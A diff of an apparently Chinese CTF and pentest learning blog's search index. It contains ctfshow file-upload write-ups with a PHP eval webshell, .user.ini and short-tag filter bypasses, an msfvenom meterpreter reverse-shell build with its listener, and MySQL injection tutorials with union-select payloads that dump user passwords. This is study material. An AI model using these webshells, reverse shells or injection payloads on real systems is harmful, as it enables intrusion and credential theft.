636ec7767d414cbcde1b268346e602f48dbea606741f78977d85a6b789c6df7ec40653c00237e8d2e341cbd572bc6b59c5da388d3e079d0534a4819f62e872449adcd5f5f0284789ea2cb896534987821a21f04e94457dece9ef6b2932d360eebc2467be275573a390e1401a4f0a213e8106cffbe0f801e37624b701c21ffa624151c4f2a239ea4fec0e01b5a76ba83b91104fe56bb4c11d8e559ca12bf5da31d8468cf24eb17af236e5107596ebdf8246c8d7a50ec9265f4c156f4943f5f598caedec92f473a229dd9f5b7b2eb339fe6ecc7193ce83cf12ff14534e0af7e5704d137ce98955131f5c6f2e91c53dc3c4b27f6be62720292ca481b7e94c5f0fd6aa12e055e03dec8b1fddcbd438790be00a194339c2133ba82980e6c9b942dbc44c00b008bcf38b2903c526520aa64310ebfc898f466709a05b3e2aa4bdb4ae789745c1bef4a7d5e58dafdb07a825cea79e1bf818cf8fd5b4bc5178a592481f167117db54210bb724a6a0c44147bd2f16ca9932b1039c1b</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+    <content><![CDATA[<h2 id="151-152"><a class="header-anchor" href="#151-152">¶</a>151-152</h2>
+<p>传一个后缀为png的一句话,bp抓包改后缀 蚁剑连接即可</p>
+<h2 id="153"><a class="header-anchor" href="#153">¶</a>153</h2>
+<p>传了后缀为.php5的一句话 发现能成功上传但是 无法解析</p>
+<p><img src="https://img-blog.csdnimg.cn/20210116130923265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>看看大佬的wp,学了新姿势</p>
+<h3 id="前置知识"><a class="header-anchor" href="#前置知识">¶</a>前置知识</h3>
+<p><a href="https://wh1tecell.top/2021/01/16/htaccess%E5%92%8C-user-ini%E6%96%87%E4%BB%B6%E7%9A%84%E5%A6%99%E7%94%A8/">.user.ini的妙用</a></p>
+<h3 id="解题步骤"><a class="header-anchor" href="#解题步骤">¶</a>解题步骤</h3>
+<p>尝试上传.user.ini,发现上传成功<br>
+<img src="https://img-blog.csdnimg.cn/2021011623593150.png" alt="在这里插入图片描述"></p>
+<p>文件内容:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file &#x3D; 1.php</span><br></pre></td></tr></table></figure>
+<p>然后上传一张图片马,1.php<br>
+文件内容:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;flag&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后访问 /upload</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#x3D;system(&#39;cat ..&#x2F;f*&#39;);</span><br></pre></td></tr></table></figure>
+<h2 id="154"><a class="header-anchor" href="#154">¶</a>154</h2>
+<p>上传后缀为png的一句话发现文件内容不符合条件</p>
+<p>发现是php这个字符串不能出现</p>
+<p>于是pHp 大写成功绕过</p>
+<p>然后跟上一题一样的解法 蚁剑连接</p>
+<p><img src="https://img-blog.csdnimg.cn/2021011700022841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>得到flag</p>
+<h2 id="155"><a class="header-anchor" href="#155">¶</a>155</h2>
+<p>大写绕过不行了</p>
+<p>尝试使用短标签绕过<br>
+对于php的标签其他写法有四种</p>
+<p>1、</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;? echo &#39;123&#39;;?&gt;</span><br></pre></td></tr></table></figure>
+<p>前提是开启配置参数short_open_tags=on<br>
+2、</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?&#x3D;(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt;</span><br></pre></td></tr></table></figure>
+<p>不需要开启参数设置</p>
+<p>3、</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;% echo &#39;123&#39;;%&gt;</span><br></pre></td></tr></table></figure>
+<p>前提是开启配置参数asp_tags=on，经过测试发现7.0及以上修改完之后也不能使用，而是报500错误，但是7.0以下版本在修改完配置后就可以使用了。<br>
+4、</p>
+<script language="php">echo '123'; </script>
+<p>不需要修改参数开关，但是只能在7.0以下可用。<br>
+对于该题，我们可用使用<code>&lt;?=(表达式)?&gt;</code>进行绕过，图片内容 <code>&lt;?=eval($_POST[flag]);?&gt;</code><br>
+剩下的步骤同153</p>
+]]></content>
       <categories>
         <category>刷题站</category>
         <category>ctfshow</category>
@@ -798,6 +831,23 @@ payload: cat flag.php||</p>
       </categories>
   </entry>
   <entry>
+    <title>msf的shell在windows中的利用</title>
+    <url>/2020/12/20/msfvenom%E7%9A%84shell%E5%9C%A8windows%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>msf的shell的制作</p>
+<a id="more"></a>
+<h3 id="msfvenom生成shell-exe"><a class="header-anchor" href="#msfvenom生成shell-exe">¶</a><strong>msfvenom生成shell.exe</strong></h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;222.222.221.140 lport&#x3D;1211 -f exe &gt; &#x2F;root&#x2F;shell.exe</span><br></pre></td></tr></table></figure>
+<h3 id="启动metasploit"><a class="header-anchor" href="#启动metasploit">¶</a>启动metasploit</h3>
+<p>输入命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<h3 id="metasploit侦听"><a class="header-anchor" href="#metasploit侦听">¶</a><strong>metasploit侦听</strong></h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;handler     #加载模块</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp    #设置payload</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lhost kali的ip   #设置kali的ip</span><br><span class="line">lhost &#x3D;&gt; 192.168.152.131</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lport 1211   #设置kali的端口</span><br><span class="line">lport &#x3D;&gt; 1211</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; exploit   #执行</span><br><span class="line">[*] Started reverse TCP handler on 222.222.221.140:1211 </span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透测试</category>
+        <category>msf shell制作</category>
+      </categories>
+  </entry>
+  <entry>
     <title>记一题php$$变量覆盖</title>
     <url>/2021/01/09/php$$%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
     <content><![CDATA[<p>彻底学一下$$变量覆盖</p>
@@ -841,23 +891,6 @@ payload: cat flag.php||</p>
       <categories>
         <category>web技术学习</category>
         <category>常见黑魔法</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>msf的shell在windows中的利用</title>
-    <url>/2020/12/20/msfvenom%E7%9A%84shell%E5%9C%A8windows%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<p>msf的shell的制作</p>
-<a id="more"></a>
-<h3 id="msfvenom生成shell-exe"><a class="header-anchor" href="#msfvenom生成shell-exe">¶</a><strong>msfvenom生成shell.exe</strong></h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;222.222.221.140 lport&#x3D;1211 -f exe &gt; &#x2F;root&#x2F;shell.exe</span><br></pre></td></tr></table></figure>
-<h3 id="启动metasploit"><a class="header-anchor" href="#启动metasploit">¶</a>启动metasploit</h3>
-<p>输入命令：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<h3 id="metasploit侦听"><a class="header-anchor" href="#metasploit侦听">¶</a><strong>metasploit侦听</strong></h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;handler     #加载模块</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp    #设置payload</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lhost kali的ip   #设置kali的ip</span><br><span class="line">lhost &#x3D;&gt; 192.168.152.131</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lport 1211   #设置kali的端口</span><br><span class="line">lport &#x3D;&gt; 1211</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; exploit   #执行</span><br><span class="line">[*] Started reverse TCP handler on 222.222.221.140:1211 </span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>渗透测试</category>
-        <category>msf shell制作</category>
       </categories>
   </entry>
   <entry>
@@ -1183,6 +1216,43 @@ file -f:报错出具体内容</p>
       </categories>
   </entry>
   <entry>
+    <title>sql注入之mysql学习基础(一)</title>
+    <url>/2021/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%B8%80)/</url>
+    <content><![CDATA[<p>了解什么是sql注入及mysql数据库介绍</p>
+<a id="more"></a>
+<h1>MySQL的数据库结构</h1>
+<p><a href="https://imgchr.com/i/sAaGcQ"><img src="https://s3.ax1x.com/2021/01/05/sAaGcQ.png" alt="sAaGcQ.png"></a></p>
+<h1>注入的产生</h1>
+<p><a href="https://imgchr.com/i/sAalh8"><img src="https://s3.ax1x.com/2021/01/05/sAalh8.png" alt="sAalh8.png"></a></p>
+<p>id变量通过get方式获取并且直接拼接到SQL语句中，而id参数用户可控，造成注入</p>
+<h1>MySQL5注入的一般流程</h1>
+<p>获取字段数-查库名-查表名-查列名-查数据</p>
+<p>获取字段数：order by 临界值<br>
+获取库名：database()<br>
+表名和列名没有内置函数 怎么查？</p>
+<p>union语句：将不同表的两个列查询的数据去重拼接<br>
+union all ：不去重</p>
+<p>获取MySQL版本：version()<br>
+MySQL5.0以下版本只能和access数据库一样猜解<br>
+而MySQL5.0以上版本内置了information_schema库，存储了所有的数据库名、表名、列名<br>
+information_schema.tables 记录表名信息<br>
+information_schema.columns 记录列名信息<br>
+TABLE_SCHEMA 数据库字段<br>
+table_name 表名<br>
+column_name 列名<br>
+查表名：<br>
+SELECT table_name FROM information_schema.tables where TABLE_SCHEMA=database();<br>
+查列名：<br>
+SELECT column_name FROM information_schema.columns where TABLE_name=‘users’;<br>
+查数据：<br>
+select 列名 from 库名.表名</p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>sql注入</category>
+      </categories>
+  </entry>
+  <entry>
     <title>python正则表达式和re库</title>
     <url>/2021/01/04/python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%92%8Cre%E5%BA%93/</url>
     <content><![CDATA[<p>正确使用正则表达式能省很多功夫</p>
@@ -1299,6 +1369,112 @@ regex也有以上六种用法</p>
       <categories>
         <category>编程学习</category>
         <category>python</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>sql注入之mysql学习基础(二)</title>
+    <url>/2021/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%BA%8C)/</url>
+    <content><![CDATA[<p>介绍几种常见的mysql注入类型</p>
+<a id="more"></a>
+<h1>MySQL注入</h1>
+<h2 id="基本介绍"><a class="header-anchor" href="#基本介绍">¶</a>基本介绍</h2>
+<h3 id="字符型"><a class="header-anchor" href="#字符型">¶</a>字符型</h3>
+<p>有这几种常见情况,闭合SQL语句，再插入我们需要的sql语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id= &#x27;$id&#x27;&quot;;</span><br><span class="line">闭合前面的单引号把后面的单引号注释掉跟上<span class="keyword">sql</span>语句</span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27; ))</span><br><span class="line">闭合单引号，闭合两个括号把后面的都注释掉跟上sql语句</span><br><span class="line">$sql=&quot;<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span>(<span class="string">&#x27;$id&#x27;</span>)&quot;;</span><br><span class="line">闭合单引号，闭合括号把后面的都注释掉跟上sql语句</span><br><span class="line">$id =&#x27;&quot;<span class="string">&#x27;.$id.&#x27;</span>&quot;&#x27;</span><br><span class="line">$sql = &quot;<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> $id&quot;;</span><br><span class="line">闭合前面的双引号再注释后面的双引号</span><br><span class="line">$id = &#x27;(&quot;<span class="string">&#x27;.$id.&#x27;</span>&quot;)&#x27;;</span><br><span class="line">$sql = &quot;<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> $id&quot;;</span><br><span class="line">1234567891011</span><br></pre></td></tr></table></figure>
+<h3 id="数字型"><a class="header-anchor" href="#数字型">¶</a>数字型</h3>
+<p>字符型和数字型的区别在于接受的参数id的类型和数据库中id的字段类型<br>
+其实和字符型的注入方式是一样的，不必过度纠结于两者具体的区别</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id&quot;;</span><br></pre></td></tr></table></figure>
+<h3 id="搜索型"><a class="header-anchor" href="#搜索型">¶</a>搜索型</h3>
+<p>就是post型的提交方式<br>
+<a href="https://imgchr.com/i/sAayjJ"><img src="https://s3.ax1x.com/2021/01/05/sAayjJ.png" alt="sAayjJ.png"></a></p>
+<h3 id="Cookie注入"><a class="header-anchor" href="#Cookie注入">¶</a>Cookie注入</h3>
+<p><a href="https://imgchr.com/i/sAabDA"><img src="https://s3.ax1x.com/2021/01/05/sAabDA.png" alt="sAabDA.png"></a></p>
+<h3 id="HTTP头注入"><a class="header-anchor" href="#HTTP头注入">¶</a>HTTP头注入</h3>
+<p>X-Forwarded-For<br>
+X-Forwarded-For是HTTP头的一个字段。它被认为是客户端通过HTTP代理或者负载均衡器连接到web服务端获取源ip地址的一个标准。类似的还有如下几种<br>
+X-Originating-IP: 127.0.0.1<br>
+X-Forwarded-For: 127.0.0.1<br>
+X-Remote-IP: 127.0.0.1<br>
+X-Remote-Addr: 127.0.0.1<br>
+Client-IP: 127.0.0.1<br>
+User-agent<br>
+用户代理(user agent)是记录软件程序的客户端信息的HTTP头字段，他可以用来统计目标和违规协议。在HTTP头中应该包含它，这个字段的第一个空格前面是软件的产品名称，后面有一个可选的斜杠和版本号。并不是所有的应用程序都会被获取到user-agent信息，但是有些应用程序利用它存储一些信息(如:购物车)。在这种情况下，我们就有必要研究下user-agent头存在的问题了。<br>
+Referer<br>
+Referer是另外一个当应用程序没有过滤存储到数据库时，容易发生SQL注入的HTTP头。它是一个允许客户端指定的可选头部字段，通过它我们可以获取到提交请求URI的服务器情况。<br>
+<a href="https://imgchr.com/i/sAaj4f"><img src="https://s3.ax1x.com/2021/01/05/sAaj4f.png" alt="sAaj4f.png"></a></p>
+<h2 id="具体实例"><a class="header-anchor" href="#具体实例">¶</a>具体实例</h2>
+<h3 id="数字型注入"><a class="header-anchor" href="#数字型注入">¶</a>数字型注入</h3>
+<h4 id="一般类型"><a class="header-anchor" href="#一般类型">¶</a>一般类型</h4>
+<p>因为不知道接收的id是1或者是&quot;1&quot;的形式我们先当成数字型注入<br>
+如何判断：'url?id=1+1’如果成功返回数据则为数字型注入<code>+</code>=<code>%2b</code><br>
+<a href="https://imgchr.com/i/sAdibn"><img src="https://s3.ax1x.com/2021/01/05/sAdibn.png" alt="sAdibn.png"></a><br>
+首先查字段<br>
+url?id = 1 order by 3 不报错<br>
+url?id = 1 order by 4 报错<br>
+所以有三个字段<br>
+接下来使用联合查询:<code>url?id = 1 union select 1,2,3</code><br>
+<a href="https://imgchr.com/i/sAdE5V"><img src="https://s3.ax1x.com/2021/01/05/sAdE5V.png" alt="sAdE5V.png"></a><br>
+查当前数据库名，版本，用户<br>
+<code>url?id = 1 union select database(),version(),user()</code><br>
+<a href="https://imgchr.com/i/sAdZCT"><img src="https://s3.ax1x.com/2021/01/05/sAdZCT.png" alt="sAdZCT.png"></a><br>
+查询有什么表<br>
+<code>url?id = 1 union select 1,2,table_name from infomation_schema.tables where table_schema = database()</code><br>
+<a href="https://imgchr.com/i/sAdm2F"><img src="https://s3.ax1x.com/2021/01/05/sAdm2F.png" alt="sAdm2F.png"></a><br>
+查询列名：<br>
+<code>url?id = 1 union select 1,2,column_name from infomation_schema.columns where table_table = 'users'</code><br>
+<a href="https://imgchr.com/i/sAd1V1"><img src="https://s3.ax1x.com/2021/01/05/sAd1V1.png" alt="sAd1V1.png"></a><br>
+查询数据：<br>
+<code>url?id = 1 union select id,username,password from users</code><br>
+<a href="https://imgchr.com/i/sAdt2D"><img src="https://s3.ax1x.com/2021/01/05/sAdt2D.png" alt="sAdt2D.png"></a></p>
+<h4 id="被单引号包裹起来的"><a class="header-anchor" href="#被单引号包裹起来的">¶</a>被单引号包裹起来的</h4>
+<p><a href="https://imgchr.com/i/sAdgxg"><img src="https://s3.ax1x.com/2021/01/05/sAdgxg.png" alt="sAdgxg.png"></a><br>
+<a href="https://imgchr.com/i/sAd5aq"><img src="https://s3.ax1x.com/2021/01/05/sAd5aq.png" alt="sAd5aq.png"></a><br>
+在之后我们拼接and 1=1 and 1= 2,发现没有报错<br>
+<a href="https://imgchr.com/i/sAdTiV"><img src="https://s3.ax1x.com/2021/01/05/sAdTiV.png" alt="sAdTiV.png"></a><br>
+之后加上<code>id = 1'</code>单引号后报错，不正常说明sql语句可控<br>
+在Mysql中<code>--+</code>代表注释此时<code>id = 1'--+</code>成功执行<br>
+<a href="https://imgchr.com/i/sAdXL9"><img src="https://s3.ax1x.com/2021/01/05/sAdXL9.png" alt="sAdXL9.png"></a><br>
+之后插上<code>id = 1 and 1=2'-- +</code>不正常，即可食用之后类似上面一般类型</p>
+<h4 id="双引号加小括号包裹"><a class="header-anchor" href="#双引号加小括号包裹">¶</a>双引号加小括号包裹</h4>
+<p><a href="https://imgchr.com/i/sAdzIx"><img src="https://s3.ax1x.com/2021/01/05/sAdzIx.png" alt="sAdzIx.png"></a><br>
+首先查看<code>id = 1</code><br>
+<a href="https://imgchr.com/i/sAwPzD"><img src="https://s3.ax1x.com/2021/01/05/sAwPzD.png" alt="sAwPzD.png"></a><br>
+类似上面<code>?id = 1') and 1 = 2-- +</code>发现1=1和1=2成功执行</p>
+<h4 id="两个括号"><a class="header-anchor" href="#两个括号">¶</a>两个括号</h4>
+<p><img src="https://img-blog.csdnimg.cn/20200618112825139.png" alt="在这里插入图片描述"><br>
+<a href="https://imgchr.com/i/sAwksH"><img src="https://s3.ax1x.com/2021/01/05/sAwksH.png" alt="sAwksH.png"></a><br>
+采用<code>? id = 1')) union select 1,2,3 -- +</code></p>
+<h3 id="字符型注入"><a class="header-anchor" href="#字符型注入">¶</a>字符型注入</h3>
+<p>如果在url后拼接<code>?id=1 and 1=1</code>or<code>and 1=2</code>分别正确错误则说明为字符型注入<br>
+注入方式和数字型类似</p>
+<h3 id="搜索型注入"><a class="header-anchor" href="#搜索型注入">¶</a>搜索型注入</h3>
+<p><a href="https://imgchr.com/i/sAwALd"><img src="https://s3.ax1x.com/2021/01/05/sAwALd.png" alt="sAwALd.png"></a><br>
+%代表%前面可以有字符后面也可以有<br>
+配合HackBar食用<br>
+<a href="https://imgchr.com/i/sAwZdI"><img src="https://s3.ax1x.com/2021/01/05/sAwZdI.png" alt="sAwZdI.png"></a><br>
+post数据<code>name = a' union select 1,2,3 -- +</code></p>
+<h3 id="Cookie注入-v2"><a class="header-anchor" href="#Cookie注入-v2">¶</a>Cookie注入</h3>
+<p><a href="https://imgchr.com/i/sAwnFP"><img src="https://s3.ax1x.com/2021/01/05/sAwnFP.png" alt="sAwnFP.png"></a><br>
+配合Burp使用<br>
+<a href="https://imgchr.com/i/sAw1yQ"><img src="https://s3.ax1x.com/2021/01/05/sAw1yQ.png" alt="sAw1yQ.png"></a><br>
+改为<code>Cookie: uid = 1 union select 1,2,3</code></p>
+<h3 id="HTTP头注入-v2"><a class="header-anchor" href="#HTTP头注入-v2">¶</a>HTTP头注入</h3>
+<p><a href="https://imgchr.com/i/sAwYoq"><img src="https://s3.ax1x.com/2021/01/05/sAwYoq.png" alt="sAwYoq.png"></a><br>
+<a href="https://imgchr.com/i/sAwfSO"><img src="https://s3.ax1x.com/2021/01/05/sAwfSO.png" alt="sAwfSO.png"></a></p>
+<p>配合Burp食用<br>
+<a href="https://imgchr.com/i/sAwbkt"><img src="https://s3.ax1x.com/2021/01/05/sAwbkt.png" alt="sAwbkt.png"></a><br>
+添加XFF头<br>
+<a href="https://imgchr.com/i/sA0FhV"><img src="https://s3.ax1x.com/2021/01/05/sA0FhV.png" alt="sA0FhV.png"></a><br>
+完美成功!!!<br>
+<code>127.0.0.1' order by 4-- +</code>成功，配合联合查询即可！！！<br>
+<a href="https://imgchr.com/i/sA0VcF"><img src="https://s3.ax1x.com/2021/01/05/sA0VcF.png" alt="sA0VcF.png"></a><br>
+看图<br>
+<a href="https://imgchr.com/i/sA0u7R"><img src="https://s3.ax1x.com/2021/01/05/sA0u7R.png" alt="sA0u7R.png"></a></p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>sql注入</category>
       </categories>
   </entry>
   <entry>
@@ -1810,210 +1986,6 @@ regex也有以上六种用法</p>
       </categories>
   </entry>
   <entry>
-    <title>sql注入之mysql学习基础(二)</title>
-    <url>/2021/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%BA%8C)/</url>
-    <content><![CDATA[<p>介绍几种常见的mysql注入类型</p>
-<a id="more"></a>
-<h1>MySQL注入</h1>
-<h2 id="基本介绍"><a class="header-anchor" href="#基本介绍">¶</a>基本介绍</h2>
-<h3 id="字符型"><a class="header-anchor" href="#字符型">¶</a>字符型</h3>
-<p>有这几种常见情况,闭合SQL语句，再插入我们需要的sql语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id= &#x27;$id&#x27;&quot;;</span><br><span class="line">闭合前面的单引号把后面的单引号注释掉跟上<span class="keyword">sql</span>语句</span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27; ))</span><br><span class="line">闭合单引号，闭合两个括号把后面的都注释掉跟上sql语句</span><br><span class="line">$sql=&quot;<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span>(<span class="string">&#x27;$id&#x27;</span>)&quot;;</span><br><span class="line">闭合单引号，闭合括号把后面的都注释掉跟上sql语句</span><br><span class="line">$id =&#x27;&quot;<span class="string">&#x27;.$id.&#x27;</span>&quot;&#x27;</span><br><span class="line">$sql = &quot;<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> $id&quot;;</span><br><span class="line">闭合前面的双引号再注释后面的双引号</span><br><span class="line">$id = &#x27;(&quot;<span class="string">&#x27;.$id.&#x27;</span>&quot;)&#x27;;</span><br><span class="line">$sql = &quot;<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> $id&quot;;</span><br><span class="line">1234567891011</span><br></pre></td></tr></table></figure>
-<h3 id="数字型"><a class="header-anchor" href="#数字型">¶</a>数字型</h3>
-<p>字符型和数字型的区别在于接受的参数id的类型和数据库中id的字段类型<br>
-其实和字符型的注入方式是一样的，不必过度纠结于两者具体的区别</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id&quot;;</span><br></pre></td></tr></table></figure>
-<h3 id="搜索型"><a class="header-anchor" href="#搜索型">¶</a>搜索型</h3>
-<p>就是post型的提交方式<br>
-<a href="https://imgchr.com/i/sAayjJ"><img src="https://s3.ax1x.com/2021/01/05/sAayjJ.png" alt="sAayjJ.png"></a></p>
-<h3 id="Cookie注入"><a class="header-anchor" href="#Cookie注入">¶</a>Cookie注入</h3>
-<p><a href="https://imgchr.com/i/sAabDA"><img src="https://s3.ax1x.com/2021/01/05/sAabDA.png" alt="sAabDA.png"></a></p>
-<h3 id="HTTP头注入"><a class="header-anchor" href="#HTTP头注入">¶</a>HTTP头注入</h3>
-<p>X-Forwarded-For<br>
-X-Forwarded-For是HTTP头的一个字段。它被认为是客户端通过HTTP代理或者负载均衡器连接到web服务端获取源ip地址的一个标准。类似的还有如下几种<br>
-X-Originating-IP: 127.0.0.1<br>
-X-Forwarded-For: 127.0.0.1<br>
-X-Remote-IP: 127.0.0.1<br>
-X-Remote-Addr: 127.0.0.1<br>
-Client-IP: 127.0.0.1<br>
-User-agent<br>
-用户代理(user agent)是记录软件程序的客户端信息的HTTP头字段，他可以用来统计目标和违规协议。在HTTP头中应该包含它，这个字段的第一个空格前面是软件的产品名称，后面有一个可选的斜杠和版本号。并不是所有的应用程序都会被获取到user-agent信息，但是有些应用程序利用它存储一些信息(如:购物车)。在这种情况下，我们就有必要研究下user-agent头存在的问题了。<br>
-Referer<br>
-Referer是另外一个当应用程序没有过滤存储到数据库时，容易发生SQL注入的HTTP头。它是一个允许客户端指定的可选头部字段，通过它我们可以获取到提交请求URI的服务器情况。<br>
-<a href="https://imgchr.com/i/sAaj4f"><img src="https://s3.ax1x.com/2021/01/05/sAaj4f.png" alt="sAaj4f.png"></a></p>
-<h2 id="具体实例"><a class="header-anchor" href="#具体实例">¶</a>具体实例</h2>
-<h3 id="数字型注入"><a class="header-anchor" href="#数字型注入">¶</a>数字型注入</h3>
-<h4 id="一般类型"><a class="header-anchor" href="#一般类型">¶</a>一般类型</h4>
-<p>因为不知道接收的id是1或者是&quot;1&quot;的形式我们先当成数字型注入<br>
-如何判断：'url?id=1+1’如果成功返回数据则为数字型注入<code>+</code>=<code>%2b</code><br>
-<a href="https://imgchr.com/i/sAdibn"><img src="https://s3.ax1x.com/2021/01/05/sAdibn.png" alt="sAdibn.png"></a><br>
-首先查字段<br>
-url?id = 1 order by 3 不报错<br>
-url?id = 1 order by 4 报错<br>
-所以有三个字段<br>
-接下来使用联合查询:<code>url?id = 1 union select 1,2,3</code><br>
-<a href="https://imgchr.com/i/sAdE5V"><img src="https://s3.ax1x.com/2021/01/05/sAdE5V.png" alt="sAdE5V.png"></a><br>
-查当前数据库名，版本，用户<br>
-<code>url?id = 1 union select database(),version(),user()</code><br>
-<a href="https://imgchr.com/i/sAdZCT"><img src="https://s3.ax1x.com/2021/01/05/sAdZCT.png" alt="sAdZCT.png"></a><br>
-查询有什么表<br>
-<code>url?id = 1 union select 1,2,table_name from infomation_schema.tables where table_schema = database()</code><br>
-<a href="https://imgchr.com/i/sAdm2F"><img src="https://s3.ax1x.com/2021/01/05/sAdm2F.png" alt="sAdm2F.png"></a><br>
-查询列名：<br>
-<code>url?id = 1 union select 1,2,column_name from infomation_schema.columns where table_table = 'users'</code><br>
-<a href="https://imgchr.com/i/sAd1V1"><img src="https://s3.ax1x.com/2021/01/05/sAd1V1.png" alt="sAd1V1.png"></a><br>
-查询数据：<br>
-<code>url?id = 1 union select id,username,password from users</code><br>
-<a href="https://imgchr.com/i/sAdt2D"><img src="https://s3.ax1x.com/2021/01/05/sAdt2D.png" alt="sAdt2D.png"></a></p>
-<h4 id="被单引号包裹起来的"><a class="header-anchor" href="#被单引号包裹起来的">¶</a>被单引号包裹起来的</h4>
-<p><a href="https://imgchr.com/i/sAdgxg"><img src="https://s3.ax1x.com/2021/01/05/sAdgxg.png" alt="sAdgxg.png"></a><br>
-<a href="https://imgchr.com/i/sAd5aq"><img src="https://s3.ax1x.com/2021/01/05/sAd5aq.png" alt="sAd5aq.png"></a><br>
-在之后我们拼接and 1=1 and 1= 2,发现没有报错<br>
-<a href="https://imgchr.com/i/sAdTiV"><img src="https://s3.ax1x.com/2021/01/05/sAdTiV.png" alt="sAdTiV.png"></a><br>
-之后加上<code>id = 1'</code>单引号后报错，不正常说明sql语句可控<br>
-在Mysql中<code>--+</code>代表注释此时<code>id = 1'--+</code>成功执行<br>
